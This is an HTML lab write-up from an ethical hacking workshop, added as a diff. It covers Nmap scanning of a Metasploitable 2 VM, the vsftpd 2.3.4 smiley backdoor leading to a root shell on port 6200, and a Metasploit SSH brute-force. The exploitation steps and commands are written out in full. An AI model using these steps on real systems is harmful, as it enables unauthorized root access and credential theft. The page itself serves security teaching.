@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="index, follow">
+
+  <title>Day 2: Service Enumeration, VSFTPD Backdoor (CVE-2011-2523) & SSH Brute-Force | BugXploit Workshop | The WH2</title>
+  <meta name="description"
+    content="Day 2 hands-on offensive security report from BugXploit (Koteshwor): Port scanning with Nmap -sV, web reconnaissance, the vsftpd 2.3.4 backdoor (tracked as CVE-2011-2523) exploitation, Metasploit ssh_login brute-force, and SSH legacy RSA key exchange login.">
+  <meta name="keywords"
+    content="Ethical Hacking Day 2, BugXploit Workshop, Nmap -sV, vsftpd 2.3.4 exploit, CVE-2011-2523, vsftpd backdoor smiley, telnet 6200 root shell, Metasploit ssh_login, msfconsole auxiliary scanner, SSH brute force, ssh HostKeyAlgorithms ssh-rsa, msfadmin, Birendra Sah, Bishal Shrestha, Chandan Kumar Thakur, The WH2, Penetration Testing Nepal, Koteshwor Kathmandu">
+  <meta name="author" content="Chandan Kumar Thakur (The WH2)">
+
+  <link rel="canonical"
+    href="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day2/">
+
+  <!-- Open Graph / Meta Consistency -->
+  <meta property="og:title" content="Day 2: Service Enumeration, VSFTPD Backdoor (CVE-2011-2523) & SSH Brute-Force | BugXploit Workshop">
+  <meta property="og:description"
+    content="Day 2 practical lab report from BugXploit Ethical Hacking workshop: Nmap service versioning, the vsftpd 2.3.4 backdoor (tracked as CVE-2011-2523) root shell trigger, Metasploit ssh_login dictionary attack, and legacy SSH connection.">
+  <meta property="og:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+  <meta property="og:url"
+    content="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day2/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="The WH2 Knowledge Hub">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Day 2: Service Enumeration, VSFTPD Backdoor (CVE-2011-2523) & SSH Brute-Force | BugXploit">
+  <meta name="twitter:description"
+    content="Detailed Day 2 penetration testing lab notes: vsftpd 2.3.4 backdoor (CVE-2011-2523), telnet root shell, and Metasploit SSH brute-force. Documented by The WH2.">
+  <meta name="twitter:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+
+  <!-- JSON-LD TechArticle Schema for AI and Search Crawlers -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Day 2: Service Enumeration, VSFTPD Backdoor (CVE-2011-2523) & SSH Brute-Force - BugXploit Workshop",
+    "description": "Comprehensive Day 2 penetration testing report covering Nmap -sV service detection, browser web enumeration, triggering the vsftpd 2.3.4 backdoor (CVE-2011-2523) on port 6200 for root shell access, and conducting SSH brute-force credential attacks via Metasploit ssh_login.",
+    "about": [
+      {
+        "@type": "Thing",
+        "name": "Service Version Scanning"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "vsftpd 2.3.4 Backdoor (CVE-2011-2523)"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "Metasploit Framework"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "Nmap"
+      },
+      {
+        "@type": "Thing",
+        "name": "SSH Brute-Force Attack"
+      }
+    ],
+    "author": {
+      "@type": "Person",
+      "name": "Chandan Kumar Thakur",
+      "alternateName": "The WH2",
+      "url": "https://www.chandankumarthakur.com.np/"
+    },
+    "contributor": [
+      {
+        "@type": "Person",
+        "name": "Birendra Sah",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/birendrasah4u2/"
+      },
+      {
+        "@type": "Person",
+        "name": "Bishal Shrestha",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/bishal0x01/"
+      }
+    ],
+    "publisher": {
+      "@type": "Organization",
+      "name": "The WH2 Knowledge Hub",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.chandankumarthakur.com.np/assets/img/wh2.jpg"
+      }
+    },
+    "datePublished": "2026-09-08",
+    "inLanguage": "en",
+    "keywords": "vsftpd 2.3.4, Nmap -sV, telnet 6200, Metasploit, msfconsole, auxiliary/scanner/ssh/ssh_login, SSH brute-force, BugXploit, Kathmandu, Nepal, Chandan Kumar Thakur, The WH2",
+    "articleSection": "Cybersecurity & Ethical Hacking"
+  }
+  </script>
+
+  <!-- Favicons -->
+  <link href="../../../assets/img/wh2.jpg" rel="icon">
+  <link href="../../../assets/img/wh2.jpg" rel="wh2-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../../../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../../../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../../../assets/css/style.css" rel="stylesheet">
+</head>
+
+<body class="knowledge-page">
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Day 2: Service Enumeration &amp; Exploitation <a href="../index.html"
+              style="font-size: 14px; background: #149ddd; color: #fff; padding: 5px 15px; border-radius: 5px; margin-left: 15px; text-decoration: none; vertical-align: middle;">Back
+              to Workshop</a></h2>
+          <ol>
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../index.html">Knowledge</a></li>
+            <li><a href="../index.html">BugXploit Workshop</a></li>
+            <li>Day 2</li>
+          </ol>
+        </div>
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Lesson Detailed Content ======= -->
+    <section class="knowledge-section">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-9 mx-auto">
+
+            <article class="lesson-article">
+
+              <!-- Article Header / Meta -->
+              <div class="border-bottom pb-3 mb-4">
+                <div class="d-flex flex-wrap gap-2 mb-2">
+                  <span class="badge bg-primary">Session 02 / 14</span>
+                  <span class="badge bg-dark">BugXploit Workshop</span>
+                </div>
+                <h1 class="fw-bold" style="color: #173b6c; font-size: 28px; line-height: 1.3;">
+                  Day 2: Service Enumeration, VSFTPD Backdoor &amp; Metasploit SSH Brute-Force
+                </h1>
+                <div class="text-muted d-flex flex-wrap gap-3 mt-2 small align-items-center">
+                  <span><i class="bi bi-person-circle text-primary"></i> <strong>Report By:</strong> Chandan Kumar
+                    Thakur (The WH2)</span>
+                  <span>
+                    <i class="bi bi-person-video3 text-primary"></i> <strong>Instructors:</strong>
+                    <a href="https://www.linkedin.com/in/birendrasah4u2/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Birendra Sah <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                    &bull;
+                    <a href="https://www.linkedin.com/in/bishal0x01/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Bishal Shrestha <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                  </span>
+                  <span><i class="bi bi-building text-primary"></i> <strong>Institute:</strong> BugXploit
+                    (Koteshwor)</span>
+                  <span><i class="bi bi-clock text-primary"></i> <strong>Read Time:</strong> ~9 mins</span>
+                </div>
+              </div>
+
+              <!-- Content Body -->
+              <div class="article-content">
+
+                <!-- Alert/Notice Box -->
+                <div class="callout-box security-notice">
+                  <h4><i class="bi bi-shield-exclamation"></i> Security Notice &amp; Lab Context</h4>
+                  <p class="mb-0 small">
+                    This technical report reflects hands-on penetration testing labs conducted against an isolated
+                    Metasploitable 2 target machine during Day 2 of the Ethical Hacking Workshop at <strong>BugXploit</strong> (Koteshwor).
+                    All methods are documented strictly for defensive research and educational understanding.
+                  </p>
+                </div>
+
+                <h2>1. Pre-Flight Connectivity Verification</h2>
+                <p>
+                  We booted up both virtual machines in Oracle VM VirtualBox: our <strong>Kali Linux</strong> attacker VM and the <strong>Metasploitable 2</strong> target. Before launching scans, we confirmed mutual network reachability using ICMP:
+                </p>
+
+                <pre><code># Test round-trip network connectivity from Kali Linux
+ping -c 4 &lt;metasploitable_ip&gt;</code></pre>
+
+                <p>
+                  Zero packet loss and immediate reply packets verified that our virtual host-only adapter was routing traffic properly between both machines.
+                </p>
+
+                <h2>2. Service &amp; Version Enumeration via Nmap</h2>
+                <p>
+                  Rather than performing a blind ping sweep or basic port scan, we leveraged Nmap's service detection flag <code>-sV</code> to probe open ports and grab exact application banners and version strings:
+                </p>
+
+                <pre><code># Scan target for open ports and detect service versions
+nmap -sV &lt;metasploitable_ip&gt;</code></pre>
+
+                <p>The scan results revealed a wide attack surface with multiple exposed daemons:</p>
+                <ul>
+                  <li><strong>Port 21/tcp:</strong> FTP &bull; <code>vsftpd 2.3.4</code></li>
+                  <li><strong>Port 22/tcp:</strong> SSH &bull; <code>OpenSSH 4.7p1 Debian</code></li>
+                  <li><strong>Port 23/tcp:</strong> Telnet &bull; Linux telnetd</li>
+                  <li><strong>Port 80/tcp:</strong> HTTP &bull; Apache httpd 2.2.8 ((Ubuntu) DAV/2)</li>
+                  <li>And numerous additional ports (RPC, NetBIOS, MySQL, PostgreSQL, etc.).</li>
+                </ul>
+
+                <h2>3. Web Surface Reconnaissance in Browser</h2>
+                <p>
+                  Since Port 80 (HTTP) was open, we navigated to <code>http://&lt;metasploitable_ip&gt;</code> in the browser to explore what web services were hosted.
+                </p>
+                <p>
+                  We investigated various pre-installed applications (e.g., TWiki, phpMyAdmin, DVWA, Mutillidae). We attempted manual testing across login and sign-up interfaces, observing form inputs, cookie headers, and default credential possibilities. While the web interface gave us a high-level map of the target's purpose, manual login attempts did not yield direct administrative access—directing our focus toward the outdated network daemons discovered during the Nmap scan.
+                </p>
+
+                <h2>4. The Infamous VSFTPD 2.3.4 Backdoor Exploitation (CVE-2011-2523)</h2>
+                <p>
+                  Looking closely at our Nmap scan, <strong>Port 21</strong> was running <strong>vsftpd 2.3.4</strong>. Researching this specific version revealed a critical security historical event: <strong>the vsftpd 2.3.4 backdoor (tracked as CVE-2011-2523)</strong>. In July 2011, the official source archive of vsftpd 2.3.4 was compromised with an intentional, malicious supply-chain backdoor.
+                </p>
+                <p>
+                  <strong>How CVE-2011-2523 Works:</strong><br>
+                  Whenever a username supplied during FTP authentication ends with the characters <code>:)</code> (a smiley face), the compromised binary triggers a malicious payload: it spawns an interactive command shell with <strong>root</strong> privileges listening on <strong>TCP Port 6200</strong>!
+                </p>
+
+                <h3>Step A: Interacting with FTP &amp; Triggering the Backdoor</h3>
+                <p>We connected to Port 21 of the Metasploitable machine using FTP or Telnet and supplied a username containing the smiley:</p>
+
+                <pre><code># Connect to the FTP daemon
+ftp &lt;metasploitable_ip&gt;
+
+# When prompted for Name, enter any username followed by :)
+Name (&lt;metasploitable_ip&gt;:kali): user:)
+Password: password123</code></pre>
+
+                <p class="small text-muted">
+                  The FTP connection hangs or returns an error, but in the background, the backdoor condition is met and Port 6200 opens immediately on the target.
+                </p>
+
+                <h3>Step B: Catching the Root Shell via Telnet</h3>
+                <p>From another terminal window in Kali Linux, we connected directly to the spawned backdoor port:</p>
+
+                <pre><code># Connect to the listener spawned on port 6200
+telnet &lt;metasploitable_ip&gt; 6200
+
+# Once connected, verify privilege level:
+whoami
+id</code></pre>
+
+                <div class="callout-box">
+                  <p class="mb-0">
+                    <strong>Exploitation Confirmed:</strong> The response returned <code>uid=0(root) gid=0(root)</code>. We attained complete, unauthenticated root access to the machine purely through an embedded vendor-level supply chain backdoor!
+                  </p>
+                </div>
+
+                <h2>5. Metasploit Framework: SSH Brute-Force Attack</h2>
+                <p>
+                  Next, instructors <strong>Birendra Sah</strong> and <strong>Bishal Shrestha</strong> introduced us to the <strong>Metasploit Framework (MSF)</strong> to demonstrate automated credential auditing against Port 22 (SSH).
+                </p>
+
+                <h3>Step A: Launching MSF &amp; Searching the Auxiliary Scanner</h3>
+                <pre><code># Launch Metasploit Console
+msfconsole
+
+# Search for the SSH login audit module
+search ssh_login
+
+# Load the auxiliary scanner module
+use auxiliary/scanner/ssh/ssh_login</code></pre>
+
+                <h3>Step B: Inspecting Module Options</h3>
+                <p>Viewing all configurable parameters for the scanner:</p>
+
+                <pre><code>show options</code></pre>
+
+                <h3>Step C: Preparing Custom Wordlists &amp; Setting Parameters</h3>
+                <p>
+                  We prepared wordlist files containing potential usernames and passwords in our working directory (e.g. <code>/root/username.txt</code> and <code>/root/password.txt</code>). Then we configured the module options:
+                </p>
+
+                <pre><code># Set target IP
+set RHOSTS &lt;metasploitable_ip&gt;
+
+# Point to username and password wordlists
+set USER_FILE /root/username.txt
+set PASS_FILE /root/password.txt
+
+# Stop the brute-force as soon as a valid credential pair is discovered
+set STOP_ON_SUCCESS true
+
+# Launch the automated attack
+run</code></pre>
+
+                <p>
+                  The auxiliary scanner cycled through the candidate credentials and reported a successful match:
+                  <br>
+                  <strong class="text-success">[+] Success: 'msfadmin:msfadmin'</strong>
+                </p>
+
+                <h2>6. Logging In via SSH (Handling Legacy RSA Key Exchange)</h2>
+                <p>
+                  With the credentials <code>msfadmin:msfadmin</code> recovered, we opened a new terminal in Kali Linux and attempted a direct SSH connection:
+                </p>
+
+                <pre><code>ssh msfadmin@&lt;metasploitable_ip&gt;</code></pre>
+
+                <p>
+                  Modern versions of OpenSSH inside updated Kali Linux rejected the handshake with an algorithm mismatch error:
+                  <br>
+                  <code class="text-danger">Unable to negotiate with &lt;ip&gt; port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</code>
+                </p>
+                <p>
+                  Because Metasploitable 2 runs an older OpenSSH version that relies on legacy SHA-1 based <code>ssh-rsa</code> keys (which modern OpenSSH disables by default for security), we explicitly enabled the legacy algorithm flags in our client command:
+                </p>
+
+                <pre><code># SSH connection enabling legacy ssh-rsa algorithms
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@&lt;metasploitable_ip&gt;
+
+# Enter password when prompted:
+# Password: msfadmin</code></pre>
+
+                <p>
+                  The connection succeeded immediately, dropping us into an interactive user session on the target!
+                </p>
+
+                <h2>7. Day 2 Key Takeaways</h2>
+                <div class="callout-box">
+                  <ul class="mb-0">
+                    <li><strong>Service Fingerprinting (-sV):</strong> Finding out that an FTP port is open is only half the battle; knowing the exact version (<code>vsftpd 2.3.4</code>) allowed us to identify a known backdoor vulnerability within seconds.</li>
+                    <li><strong>Supply Chain Vulnerabilities:</strong> The vsftpd 2.3.4 incident emphasizes why software supply chains and integrity checks (checksums/signatures) are vital for modern infrastructure defense.</li>
+                    <li><strong>Brute-Force &amp; Weak Credentials:</strong> Weak default credentials like <code>msfadmin:msfadmin</code> can be rapidly identified with automated tools like Metasploit's <code>auxiliary/scanner/ssh/ssh_login</code>.</li>
+                    <li><strong>Cryptographic Deprecation:</strong> Newer operating systems actively drop outdated ciphers and key exchanges (like RSA-SHA1), requiring penetration testers to understand client-side algorithm negotiation flags.</li>
+                  </ul>
+                </div>
+
+                <!-- Ethical Use & Legal Warning Notice -->
+                <div class="p-3 my-4 rounded border border-danger bg-danger bg-opacity-10 d-flex align-items-start gap-3">
+                  <div class="text-danger fs-2" style="line-height: 1;">
+                    <i class="bi bi-exclamation-triangle-fill"></i>
+                  </div>
+                  <div>
+                    <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
+                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                    </h5>
+                    <p class="mb-0 text-dark small" style="line-height: 1.6;">
+                      Do not attempt any unauthorized scanning, enumeration, backdoor triggers, or brute-force attacks against networks, servers, or devices that you do not own or lack explicit, documented authorization to test. Performing unauthorized penetration testing or cyberattacks is illegal under the Electronic Transactions Act (ETA) of Nepal and international cybercrime statutes. TheWH2 and BugXploit promote strictly ethical security practices and white-hat security research.
+                    </p>
+                  </div>
+                </div>
+
+              </div><!-- .article-content -->
+
+              <!-- Bottom Navigation -->
+              <div class="lesson-nav-buttons">
+                <a href="../day1/index.html" class="btn btn-outline-secondary">
+                  <i class="bi bi-arrow-left"></i> Previous: Day 1
+                </a>
+                <a href="../index.html" class="btn btn-primary">
+                  <i class="bi bi-grid-fill"></i> Workshop Overview
+                </a>
+              </div>
+
+            </article>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Lesson Detailed Content -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="copyright">
+        &copy; 2026 <strong><span>The WH2</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed with Security by <a href="../../../index.html">The WH2</a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="../../../assets/vendor/aos/aos.js"></script>
+  <script src="../../../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../../../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../../../assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../../../assets/js/main.js"></script>
+
+  <!-- Automatic Clipboard Copy Button for all code blocks -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const codeBlocks = document.querySelectorAll('.lesson-article pre');
+
+      codeBlocks.forEach(function (pre) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-block-wrapper';
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.type = 'button';
+        copyBtn.setAttribute('title', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+
+        copyBtn.addEventListener('click', function () {
+          const codeText = pre.innerText.trim();
+          navigator.clipboard.writeText(codeText).then(function () {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<i class="bi bi-check-lg"></i>';
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+            }, 2000);
+          }).catch(function (err) {
+            console.error('Failed to copy: ', err);
+          });
+        });
+
+        wrapper.appendChild(copyBtn);
+      });
+    });
+  </script>
+
+</body>
+
+</html>
